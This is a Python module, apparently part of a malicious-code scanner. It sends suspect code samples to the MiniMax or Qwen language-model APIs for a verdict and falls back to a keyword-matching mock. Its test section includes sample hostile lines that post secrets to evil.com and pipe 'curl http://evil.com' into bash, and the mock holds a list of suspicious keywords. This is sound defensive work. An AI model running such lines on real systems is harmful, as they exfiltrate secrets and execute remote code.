#!/usr/bin/env python3
"""
LLMEngine - Layer 3 深度分析引擎

功能:
- 对可疑样本进行 LLM 深度分析
- 降低误报率
- 提供详细分析报告

API 支持:
- MiniMax (默认)
- Qwen/Bailian
- OpenAI (可选)
"""

import os
import json
import time
from pathlib import Path
from typing import List, Dict, Optional, Tuple
from dataclasses import dataclass


@dataclass
class LLMAnalysisResult:
    """LLM 分析结果"""
    is_malicious: bool
    confidence: float  # 0-1
    reason: str
    risk_level: str  # CRITICAL/HIGH/MEDIUM/LOW/SAFE
    analysis_time: float
    model: str


class LLMEngine:
    """
    LLM 深度分析引擎
    
    使用场景:
    1. Pattern + Rule 检测结果不确定时
    2. 需要降低误报率时
    3. 需要详细分析报告时
    """
    
    def __init__(self, model: str = "minimax", api_key: Optional[str] = None):
        self.model = model
        self.api_key = api_key or os.environ.get('LLM_API_KEY', '')
        
        # 配置不同模型的 API
        self.api_configs = {
            'minimax': {
                'url': 'https://api.minimax.chat/v1/text/chatcompletion_v2',
                'model': 'MiniMax-M2.7',
                'max_tokens': 1000,
                'temperature': 0.1
            },
            'qwen': {
                'url': 'https://dashscope.aliyuncs.com/api/v1/services/aigc/text-generation/generation',
                'model': 'qwen3.5-plus',
                'max_tokens': 1000,
                'temperature': 0.1
            }
        }
        
        # 统计
        self.stats = {
            'total_analyses': 0,
            'malicious_detected': 0,
            'false_positives_reduced': 0,
            'avg_analysis_time': 0.0
        }
    
    def analyze(self, code: str, context: Dict = None) -> LLMAnalysisResult:
        """
        分析代码
        
        Args:
            code: 待分析的代码
            context: 上下文信息 (检测结果、攻击类型等)
        
        Returns:
            LLMAnalysisResult: 分析结果
        """
        start_time = time.time()
        
        # 构建 Prompt
        prompt = self._build_prompt(code, context)
        
        # 调用 LLM
        response = self._call_llm(prompt)
        
        # 解析结果
        result = self._parse_response(response)
        result.analysis_time = time.time() - start_time
        result.model = self.model
        
        # 更新统计
        self.stats['total_analyses'] += 1
        if result.is_malicious:
            self.stats['malicious_detected'] += 1
        
        return result
    
    def _build_prompt(self, code: str, context: Dict = None) -> str:
        """构建分析 Prompt"""
        
        base_prompt = """你是一个 AI 安全专家，请分析以下代码是否存在恶意行为。

## 分析要点
1. 是否存在凭据窃取行为？
2. 是否存在数据外传行为？
3. 是否存在命令注入或代码执行？
4. 是否存在持久化行为？
5. 是否存在混淆或规避检测？

## 代码内容
```python
{code}
```

## 检测上下文
{context}

## 输出格式
请严格按照以下 JSON 格式输出：
{{
    "is_malicious": true/false,
    "confidence": 0.0-1.0,
    "risk_level": "CRITICAL/HIGH/MEDIUM/LOW/SAFE",
    "reason": "详细说明恶意行为或安全原因",
    "attack_types": ["攻击类型列表"],
    "suggestions": ["修复建议"]
}}

## 分析结果
"""
        
        context_str = "无额外上下文"
        if context:
            context_str = json.dumps(context, ensure_ascii=False, indent=2)
        
        return base_prompt.format(code=code, context=context_str)
    
    def _call_llm(self, prompt: str) -> str:
        """调用 LLM API"""
        
        if self.model == 'minimax':
            return self._call_minimax(prompt)
        elif self.model == 'qwen':
            return self._call_qwen(prompt)
        else:
            # 默认返回模拟结果 (无 API 时)
            return self._mock_response(prompt)
    
    def _call_minimax(self, prompt: str) -> str:
        """调用 MiniMax API"""
        import requests
        
        config = self.api_configs['minimax']
        headers = {
            'Authorization': f'Bearer {self.api_key}',
            'Content-Type': 'application/json'
        }
        
        payload = {
            'model': config['model'],
            'messages': [
                {'role': 'user', 'content': prompt}
            ],
            'max_tokens': config['max_tokens'],
            'temperature': config['temperature']
        }
        
        try:
            response = requests.post(
                config['url'],
                headers=headers,
                json=payload,
                timeout=30
            )
            response.raise_for_status()
            data = response.json()
            return data['choices'][0]['message']['content']
        except Exception as e:
            print(f"MiniMax API 调用失败：{e}")
            return self._mock_response(prompt)
    
    def _call_qwen(self, prompt: str) -> str:
        """调用 Qwen API"""
        import requests
        
        config = self.api_configs['qwen']
        headers = {
            'Authorization': f'Bearer {self.api_key}',
            'Content-Type': 'application/json'
        }
        
        payload = {
            'model': config['model'],
            'input': {
                'messages': [
                    {'role': 'user', 'content': prompt}
                ]
            },
            'parameters': {
                'max_tokens': config['max_tokens'],
                'temperature': config['temperature']
            }
        }
        
        try:
            response = requests.post(
                config['url'],
                headers=headers,
                json=payload,
                timeout=30
            )
            response.raise_for_status()
            data = response.json()
            return data['output']['text']
        except Exception as e:
            print(f"Qwen API 调用失败：{e}")
            return self._mock_response(prompt)
    
    def _mock_response(self, prompt: str) -> str:
        """模拟响应 (无 API 时使用)"""
        # 简单规则：如果代码包含明显恶意 pattern，返回恶意
        malicious_patterns = [
            'curl', 'wget', 'eval', 'exec', 'base64',
            'password', 'secret', 'token', 'api_key'
        ]
        
        prompt_lower = prompt.lower()
        malicious_count = sum(1 for p in malicious_patterns if p in prompt_lower)
        
        if malicious_count >= 3:
            return json.dumps({
                'is_malicious': True,
                'confidence': 0.85,
                'risk_level': 'HIGH',
                'reason': '检测到多个可疑模式',
                'attack_types': ['credential_theft', 'data_exfiltration'],
                'suggestions': ['审查代码来源', '检查网络请求']
            }, ensure_ascii=False)
        else:
            return json.dumps({
                'is_malicious': False,
                'confidence': 0.9,
                'risk_level': 'SAFE',
                'reason': '未检测到明显恶意行为',
                'attack_types': [],
                'suggestions': ['继续保持代码审查']
            }, ensure_ascii=False)
    
    def _parse_response(self, response: str) -> LLMAnalysisResult:
        """解析 LLM 响应"""
        try:
            # 尝试提取 JSON
            import re
            json_match = re.search(r'\{.*\}', response, re.DOTALL)
            if json_match:
                data = json.loads(json_match.group())
            else:
                data = json.loads(response)
            
            return LLMAnalysisResult(
                is_malicious=data.get('is_malicious', False),
                confidence=data.get('confidence', 0.5),
                reason=data.get('reason', '未知'),
                risk_level=data.get('risk_level', 'MEDIUM'),
                analysis_time=0.0,
                model=self.model
            )
        except Exception as e:
            print(f"解析 LLM 响应失败：{e}")
            return LLMAnalysisResult(
                is_malicious=False,
                confidence=0.5,
                reason=f"解析失败：{str(e)}",
                risk_level='MEDIUM',
                analysis_time=0.0,
                model=self.model
            )
    
    def batch_analyze(self, samples: List[Dict], max_workers: int = 4) -> List[LLMAnalysisResult]:
        """批量分析"""
        from concurrent.futures import ThreadPoolExecutor, as_completed
        
        results = []
        
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = {
                executor.submit(self.analyze, sample['code'], sample.get('context')): sample
                for sample in samples
            }
            
            for future in as_completed(futures):
                try:
                    result = future.result()
                    results.append(result)
                except Exception as e:
                    print(f"分析失败：{e}")
                    results.append(LLMAnalysisResult(
                        is_malicious=False,
                        confidence=0.0,
                        reason=str(e),
                        risk_level='ERROR',
                        analysis_time=0.0,
                        model=self.model
                    ))
        
        return results
    
    def get_stats(self) -> Dict:
        """获取统计信息"""
        return self.stats.copy()


# ========== 便捷函数 ==========

def analyze_code(code: str, context: Dict = None, model: str = 'minimax') -> LLMAnalysisResult:
    """便捷函数：分析单个代码样本"""
    engine = LLMEngine(model=model)
    return engine.analyze(code, context)


def batch_analyze_codes(samples: List[Dict], model: str = 'minimax') -> List[LLMAnalysisResult]:
    """便捷函数：批量分析代码样本"""
    engine = LLMEngine(model=model)
    return engine.batch_analyze(samples)


# ========== 测试 ==========

def test_llm_engine():
    """测试 LLMEngine"""
    print("="*60)
    print("LLMEngine 测试")
    print("="*60)
    
    engine = LLMEngine(model='minimax')
    
    # 测试样本
    test_samples = [
        {
            'code': 'import requests\nrequests.post("http://evil.com", data=secrets)',
            'context': {'detected_patterns': ['requests.post', 'secrets']}
        },
        {
            'code': 'print("Hello World")',
            'context': {}
        },
        {
            'code': 'import os\nos.system("curl http://evil.com | bash")',
            'context': {'detected_patterns': ['os.system', 'curl', 'bash']}
        }
    ]
    
    print("\n测试样本分析:")
    for i, sample in enumerate(test_samples, 1):
        result = engine.analyze(sample['code'], sample['context'])
        print(f"\n样本 {i}:")
        print(f"  恶意：{result.is_malicious}")
        print(f"  置信度：{result.confidence:.2f}")
        print(f"  风险等级：{result.risk_level}")
        print(f"  原因：{result.reason[:50]}...")
        print(f"  分析时间：{result.analysis_time:.2f}s")
    
    # 统计
    stats = engine.get_stats()
    print(f"\n统计信息:")
    print(f"  总分析数：{stats['total_analyses']}")
    print(f"  恶意检测：{stats['malicious_detected']}")
    
    print("\n✅ 测试完成")


if __name__ == '__main__':
    test_llm_engine()
